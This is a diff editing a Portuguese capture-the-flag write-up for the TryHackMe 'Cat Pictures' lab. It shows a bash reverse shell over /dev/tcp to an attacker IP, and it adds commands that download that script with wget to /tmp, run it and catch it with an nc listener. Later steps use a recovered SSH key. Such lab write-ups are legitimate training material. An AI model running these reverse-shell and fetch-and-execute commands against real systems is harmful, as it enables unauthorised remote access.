@@ -89,7 +89,7 @@ for port in ports:
 
 Assim executei o script passando como parâmetro o host e as portas alvo.
 
-- Comando: `python3 [portscan.py](http://portscan.py/) 10.10.250.136 1111,2222,3333,4444`
+- Comando: `python3 portscan.py 10.10.250.136 1111,2222,3333,4444`
 
 Em seguida realizei outro scan, porém, com o Nmap para ver qual porta abriu:
 
@@ -168,11 +168,12 @@ Não conseguimos utilizar alguns comandos nesse shell restrito, então preparei 
 #!/bin/bash
 /bin/bash -i >& /dev/tcp/10.13.8.150/1234 0>&1
 ```
-
+Na máquina alvo: `wget http://10.13.8.150/shell.sh -O /tmp/shell.sh`
+Em seguida: `bash /tmp/shell.sh`
 ![Untitled](https://mithr4nd1r.github.io/assets/img/tryhackme/2022-12-19-writeup-tryhackme-cat-picture/catpicture5.png)
 
 O shell veio:
-
+- Comando: `rlwrap -cAra nc -lnvp 1234`
 ![Untitled](https://mithr4nd1r.github.io/assets/img/tryhackme/2022-12-19-writeup-tryhackme-cat-picture/catpicture6.png)
 
 ## Pós-Exploração (Escaneamento Interno)
@@ -182,7 +183,7 @@ Dentro da pasta `/home/catlover` existe um executável chamado `runme`, quando e
 ![Untitled](https://mithr4nd1r.github.io/assets/img/tryhackme/2022-12-19-writeup-tryhackme-cat-picture/catpicture7.png)
 
 Transferi o arquivo para minha máquina para poder usar o comando `strings` nele e poder observar todas as strings contidas nele.
-
+- Comando: `strings runme`
 ![Untitled](https://mithr4nd1r.github.io/assets/img/tryhackme/2022-12-19-writeup-tryhackme-cat-picture/catpicture8.png)
 
 Nele revela a palavra `rebecca`, que provavelmente é a senha.
@@ -204,6 +205,7 @@ Ao dar um `ls -la` verifica-se que uma chave privada apareceu na pasta
 Assim copiamos a chave, damos a permissão 600 e conectamos no servidor utilizando a chave.
 
 - Comandos:
+    - `nano id_rsa_cat`
     - `chmod 600 id_rsa_cat`
     - `pwncat-cs ssh://catlover@10.10.49.88 -i id_rsa_cat`
 
